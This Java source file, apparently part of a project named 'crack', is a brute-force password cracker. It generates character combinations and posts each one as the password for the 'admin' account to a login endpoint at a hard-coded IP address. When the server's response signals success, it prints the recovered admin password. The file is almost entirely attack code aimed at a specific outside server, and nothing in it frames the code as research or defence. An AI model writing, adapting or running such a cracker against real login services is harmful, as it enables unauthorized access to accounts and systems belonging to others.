package com.lh.crack;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.lh.crack.crawler.CrawlerUtils;
import com.lh.crack.permutation.Combination;

import net.sf.json.JSONObject;

/**
 * 发送post请求验证密码
 * @author zeng_xiaohui
 *
 */
public class CrackPassword {

	public static void crawlerquest(String password) {
		Map<String, String> dataMap = new HashMap<String, String>();
		dataMap.put("user", "admin");
		dataMap.put("pad", password);
		dataMap.put("language", "zh_CN");
		JSONObject jsonObject = CrawlerUtils.getJSONFromPost("http://115.28.28.169:8080/main/newToMain.action",
				dataMap);
		if (!"0".equals(jsonObject.get("data")) && !"2".equals(jsonObject.get("data"))) {
			System.out.println("admin的密码为："+password);
		} 
		/*else {
			System.out.println("密码错误！");
		}*/
	}

	public String getPassword(String[] strs, int digit) {
		if (digit != strs.length + 1) {
			List<String[]> list2 = new ArrayList<String[]>();
			String breakoff = "";
			for (int i = 1; i <= digit; i++) {
				breakoff += strs[strs.length-1];
				list2.add(strs);
			}
			//doExchange(list2, digit);
			Combination.listConbination(list2,0,"",0,breakoff);
			System.out.println("破解失败");
			// digit++;
		}
		return "结束";
	}


	public void foreachList(String lists, int digit) {
		String password = "";
		lists = lists.replaceAll("\\[", "");
		lists = lists.replaceAll("\\]", "");
		lists = lists.replaceAll("\"", "");
		String[] strs = lists.split(",");
		for (int i = 0; i < strs.length; i++) {
			password += strs[i];
			if (((i + 1) % digit) == 0) {
				System.out.println("尝试密码为：" + password);
				crawlerquest(password);
				password = "";
			}
		}
	}

}
